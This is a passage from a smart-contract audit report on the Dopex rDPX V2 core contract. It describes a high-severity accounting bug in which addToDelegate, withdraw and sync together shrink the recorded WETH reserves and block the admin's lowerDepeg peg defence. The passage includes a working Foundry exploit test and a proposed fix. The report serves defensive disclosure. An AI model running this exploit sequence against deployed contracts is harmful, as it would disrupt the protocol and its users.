href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/88\">deadrxsezzz</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/78\">0xWaitress</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/944\">0x111</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/874\">atrixs6</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/796\">said</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/581\">LFGSecurity</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/372\">0xCiphky</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/368\">grearlake</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/277\">Yanchuan</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/59\">chaduke</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L964\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L964</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L975-L990\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L975-L990</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1002\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1002</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1110\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1110</a></p>\n<p>In a scenario where extreme market conditions necessitate the execution of the <code>lowerDepeg</code> function to restore the dpxETH/ETH peg, an attacker can exploit the flawed interaction between the <code>addToDelegate</code>, <code>withdraw</code>, and <code>sync</code> functions to force a revert on the admin’s attempt to restore the peg. As a result, the protocol will not be able to effectively defend the peg, leading to potential disruptions in the protocol’s peg stability module.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>If 1 dpxETH &#x3C; 1 ETH, the <code>rpdxV2Core</code> contract admin will call the <code>lowerDepeg</code> function to restore the peg. The backing reserves are used to buy and burn dpxETH from the curve pool to bring back the peg to 1 ETH. An attacker can execute a transaction to manipulate the WETH reserves and cause the admin transaction to revert.</p>\n<ol>\n<li>The attacker initiates the exploit by calling the <code>addToDelegate</code> function, and depositing WETH into <code>rpdxV2Core</code> contract. By doing so, the attacker effectively updates the <code>totalWethDelegated</code> state variable, increasing it by the deposited amount.</li>\n</ol>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L964\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L964</a></p>\n<ol start=\"2\">\n<li>The attacker subsequently calls the <code>withdraw</code> function, which does not update the <code>totalWethDelegated</code> state variable. Consequently, the <code>totalWethDelegated</code> variable retains the inflated value of WETH delegated, even though the WETH has neither been delegated nor it remains available, since it was withdrawn.</li>\n</ol>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L975-L990\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L975-L990</a></p>\n<ol start=\"3\">\n<li>Finally, the attacker calls the <code>sync</code> function which inaccurately updates the WETH reserves by subtracting the inflated <code>totalWethDelegated</code> value. This manipulation artificially reduces the WETH reserves in the contract to a really small value or even zero.</li>\n</ol>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1002\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1002</a></p>\n<ol start=\"4\">\n<li>The <code>rpdxV2Core</code> admin calls the <code>lowerDepeg</code> function to restore the dpxETH/ETH peg, which ultimately will revert due to an underflow error.</li>\n</ol>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1110\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1110</a></p>\n<p>Note that the attacker can loop through the process outlined in steps 1. and 2., thereby increasing the <code>totalWethDelegated</code> through a small input amount, before executing the sync function. As a result, this attack becomes financially inexpensive to execute.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: MIT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">19</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">Setup</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;./Setup.t.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../lib/forge-std/src/console.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../lib/forge-std/src/StdError.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Exploit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Setup</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testExploitWETHReserves</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// note: setup</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x1001</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user2</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x1002</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">), </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1000000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// user1 bonds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bond</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// note: weth reserves manipulation </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// gets the reserve of WETH in the core contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethReserveBefore</span><span class=\"mtk1\">,) = </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getReserveTokenInfo</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;WETH&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;WETH reserve before: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">wethReserveBefore</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// approve rpdxV2Core to spend WETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// delegate WETH, and assert it was delegated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegateId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addToDelegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wethReserveBefore</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalWethDelegated</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">wethReserveBefore</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// withdraw WETH, assert WETH was withdrawn but it still says WETH is delegated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">delegateId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalWethDelegated</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">wethReserveBefore</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// assert that the user2 has the same balance he had before</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">) == </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// call sync and make WETH reserves -= WETH delegated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sync</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check the amount of WETH in reserves after and assert it is smaller than before</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethReserveAfter</span><span class=\"mtk1\">,) = </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getReserveTokenInfo</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;WETH&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wethReserveBefore</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalWethDelegated</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">wethReserveAfter</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;WETH reserve after:  &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">wethReserveAfter</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// note: admin tries to defend the peg.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update the dpxETH price to simulate 1 dpxETH &lt; 1 ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">dpxEthPriceOracle</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateDpxEthPrice</span><span class=\"mtk1\">(</span><span class=\"mtk7\">98137847</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// expect the transaction to revert with an underflow.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stdError</span><span class=\"mtk1\">.</span><span class=\"mtk12\">arithmeticError</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lowerDepeg</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Update the totalWethDelegated in the <code>withdraw</code> function.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegateId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountWithdrawn</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_whenNotPaused</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">delegateId</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">delegates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">, </span><span class=\"mtk7\">14</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Delegate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">delegateId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk7\">9</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amountWithdrawn</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">activeCollateral</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amountWithdrawn</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">15</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">activeCollateral</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+       </span><span class=\"mtk12\">totalWethDelegated</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">amountWithdrawn</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">weth</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountWithdrawn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">LogDelegateWithdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">delegateId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountWithdrawn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/239#issuecomment-1773166739\">Alex the Entreprenerd (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>Best + explains why it’s high.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2186\">psytama (Dopex) confirmed via duplicate issue 2186</a></strong></p>\n<hr>\n<h2 id=\"h-09-relpcontract-wrongfully-assumes-protocol-owns-all-of-the-liquidity-in-the-uniswapv2-pool\" style=\"position:relative;\"><a href=\"#h-09-relpcontract-wrongfully-assumes-protocol-owns-all-of-the-liquidity-in-the-uniswapv2-pool\" aria-label=\"h 09 relpcontract wrongfully assumes protocol owns all of the liquidity in the uniswapv2 pool permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/143\">[H-09] <code>ReLPContract</code> wrongfully assumes protocol owns all of the liquidity in the UniswapV2 pool</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/143\">deadrxsezzz</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1518\">kutugu</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/905\">said</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1812\">QiuhaoLi</a>, <a 